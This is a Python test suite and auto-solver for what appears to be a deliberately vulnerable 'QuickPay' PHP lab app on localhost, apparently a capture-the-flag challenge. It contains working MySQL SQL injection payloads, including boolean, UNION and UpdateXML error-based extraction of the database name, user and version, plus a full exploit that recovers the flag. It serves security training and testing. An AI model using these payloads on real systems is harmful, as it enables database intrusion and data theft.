#!/usr/bin/env python3
"""
Automated tests for MySQL Error-Based SQL Injection via UpdateXML
Tests the vulnerable QuickPay application for SQL injection vulnerabilities
"""

import pytest
import requests
import time
import re
from urllib.parse import urljoin

class TestSQLInjection:
    """Test suite for SQL injection vulnerabilities"""
    
    def setup_method(self):
        """Setup test environment"""
        self.base_url = "http://localhost:3206"
        self.search_url = urljoin(self.base_url, "/search.php")
        self.session = requests.Session()
        
        # Wait for application to be ready
        self._wait_for_app()
    
    def _wait_for_app(self, timeout=30):
        """Wait for the application to be ready"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.base_url, timeout=5)
                if response.status_code == 200:
                    return
            except requests.RequestException:
                pass
            time.sleep(1)
        raise Exception("Application not ready within timeout")
    
    def test_application_accessible(self):
        """Test that the application is accessible"""
        response = self.session.get(self.base_url)
        assert response.status_code == 200
        assert "QuickPay" in response.text
    
    def test_search_page_accessible(self):
        """Test that the search page is accessible"""
        response = self.session.get(self.search_url)
        assert response.status_code == 200
        assert "Transaction Search" in response.text
        assert "search" in response.text.lower()
    
    def test_basic_sql_injection_detection(self):
        """Test basic SQL injection detection with single quote"""
        payload = "'"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Check for SQL error in response
        error_indicators = [
            "sql syntax",
            "mysql",
            "database error",
            "syntax error",
            "mysql_fetch_array",
            "mysql_num_rows"
        ]
        
        response_lower = response.text.lower()
        has_error = any(indicator in response_lower for indicator in error_indicators)
        assert has_error, f"Expected SQL error for payload '{payload}', but no error found"
    
    def test_boolean_based_injection(self):
        """Test boolean-based SQL injection"""
        payload = "' OR '1'='1"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Should return all transactions
        assert "transaction" in response.text.lower()
    
    def test_updatexml_database_name_extraction(self):
        """Test UpdateXML function to extract database name"""
        payload = "1' and UpdateXML(1,concat(0x7e,(select database()),0x7e),1)-- -"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Look for database name in error message
        # The database name should be between tildes (~)
        db_name_match = re.search(r'~([^~]+)~', response.text)
        assert db_name_match is not None, "Database name not found in error message"
        
        db_name = db_name_match.group(1)
        assert db_name == "quickpay", f"Expected database name 'quickpay', got '{db_name}'"
        
        print(f"✓ Successfully extracted database name: {db_name}")
    
    def test_updatexml_user_extraction(self):
        """Test UpdateXML function to extract database user"""
        payload = "1' and UpdateXML(1,concat(0x7e,(select user()),0x7e),1)-- -"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Look for user in error message
        user_match = re.search(r'~([^~]+)~', response.text)
        assert user_match is not None, "Database user not found in error message"
        
        user = user_match.group(1)
        assert "quickpay" in user.lower(), f"Expected user to contain 'quickpay', got '{user}'"
        
        print(f"✓ Successfully extracted database user: {user}")
    
    def test_updatexml_version_extraction(self):
        """Test UpdateXML function to extract MySQL version"""
        payload = "1' and UpdateXML(1,concat(0x7e,(select version()),0x7e),1)-- -"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Look for version in error message
        version_match = re.search(r'~([^~]+)~', response.text)
        assert version_match is not None, "MySQL version not found in error message"
        
        version = version_match.group(1)
        assert "5.7" in version, f"Expected MySQL 5.7, got '{version}'"
        
        print(f"✓ Successfully extracted MySQL version: {version}")
    
    def test_legitimate_search_functionality(self):
        """Test that legitimate search still works"""
        # Test with a legitimate search term
        data = {"query": "completed"}
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Should return some results
        assert "transaction" in response.text.lower() or "found" in response.text.lower()
    
    def test_error_message_disclosure(self):
        """Test that error messages are disclosed (vulnerability feature)"""
        payload = "'"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        # Check that error message is displayed to user
        assert "Database error:" in response.text, "Error message should be disclosed to user"
    
    def test_multiple_payloads(self):
        """Test multiple SQL injection payloads"""
        payloads = [
            "' OR 1=1-- -",
            "' UNION SELECT 1,2,3,4,5,6,7-- -",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -"
        ]
        
        for payload in payloads:
            data = {"query": payload}
            response = self.session.post(self.search_url, data=data)
            assert response.status_code == 200
            
            # At least one should cause an error or return data
            if "error" in response.text.lower() or "transaction" in response.text.lower():
                print(f"✓ Payload '{payload}' executed successfully")
            else:
                print(f"⚠ Payload '{payload}' may not have worked as expected")

class TestAutoSolve:
    """Auto-solve functionality for testing"""
    
    def setup_method(self):
        """Setup test environment"""
        self.base_url = "http://localhost:3206"
        self.search_url = urljoin(self.base_url, "/search.php")
        self.session = requests.Session()
        self._wait_for_app()
    
    def _wait_for_app(self, timeout=30):
        """Wait for the application to be ready"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.base_url, timeout=5)
                if response.status_code == 200:
                    return
            except requests.RequestException:
                pass
            time.sleep(1)
        raise Exception("Application not ready within timeout")
    
    def test_auto_solve_database_name(self):
        """Auto-solve: Extract database name using UpdateXML"""
        payload = "1' and UpdateXML(1,concat(0x7e,(select database()),0x7e),1)-- -"
        data = {"query": payload}
        
        response = self.session.post(self.search_url, data=data)
        assert response.status_code == 200
        
        db_name_match = re.search(r'~([^~]+)~', response.text)
        assert db_name_match is not None
        
        db_name = db_name_match.group(1)
        print(f"🎯 AUTO-SOLVE: Database name = {db_name}")
        return db_name
    
    def test_auto_solve_complete_exploit(self):
        """Auto-solve: Complete exploit to extract all required information"""
        print("\n🔍 Starting auto-solve exploit...")
        
        # Extract database name
        db_name = self.test_auto_solve_database_name()
        
        # Extract database user
        payload = "1' and UpdateXML(1,concat(0x7e,(select user()),0x7e),1)-- -"
        data = {"query": payload}
        response = self.session.post(self.search_url, data=data)
        user_match = re.search(r'~([^~]+)~', response.text)
        user = user_match.group(1) if user_match else "Unknown"
        
        # Extract MySQL version
        payload = "1' and UpdateXML(1,concat(0x7e,(select version()),0x7e),1)-- -"
        data = {"query": payload}
        response = self.session.post(self.search_url, data=data)
        version_match = re.search(r'~([^~]+)~', response.text)
        version = version_match.group(1) if version_match else "Unknown"
        
        print(f"🎯 AUTO-SOLVE RESULTS:")
        print(f"   Database Name: {db_name}")
        print(f"   Database User: {user}")
        print(f"   MySQL Version: {version}")
        print(f"   Flag: {db_name} (database name)")
        
        # Verify the flag
        assert db_name == "quickpay", f"Flag verification failed. Expected 'quickpay', got '{db_name}'"
        print("✅ Flag verification successful!")
        
        return {
            "database_name": db_name,
            "database_user": user,
            "mysql_version": version,
            "flag": db_name
        }

if __name__ == "__main__":
    # Run the auto-solve
    auto_solve = TestAutoSolve()
    result = auto_solve.test_auto_solve_complete_exploit()
    print(f"\n🏁 Exploit completed successfully!")
    print(f"   Final flag: {result['flag']}") 